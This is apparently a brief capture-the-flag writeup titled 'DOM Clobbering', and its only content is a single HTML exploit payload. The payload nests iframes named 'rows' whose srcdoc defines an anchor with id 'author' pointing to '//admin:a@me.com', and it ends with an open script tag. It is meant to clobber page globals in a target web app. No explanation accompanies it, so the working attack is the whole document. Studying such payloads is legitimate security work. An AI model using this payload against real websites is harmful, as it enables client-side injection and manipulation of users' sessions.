# Writeup

DOM Clobbering

```html
<iframe name=rows srcdoc=" <iframe name=rows srcdoc=&quot; <a id='author' href='//admin:a@me.com'></a> &quot;></iframe> "></iframe><script>
```